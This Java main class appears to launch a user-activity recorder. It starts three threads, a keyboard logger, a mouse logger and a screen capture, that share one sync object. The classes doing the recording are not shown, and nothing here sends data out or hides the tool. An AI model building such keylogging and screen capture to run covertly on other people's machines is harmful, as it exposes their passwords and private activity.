package app;

public class App {
    
   public static void main(String[] args) throws Exception 
   {
        Sync sync = new Sync();
        Keyboard keyboardLogger = new Keyboard("Keyboard", sync);
        Mouse mouseLogger = new Mouse("Mouse", sync);
        Screen screenCapture = new Screen("Screen", sync);
        keyboardLogger.start();
        mouseLogger.start();
        screenCapture.start();
    }
}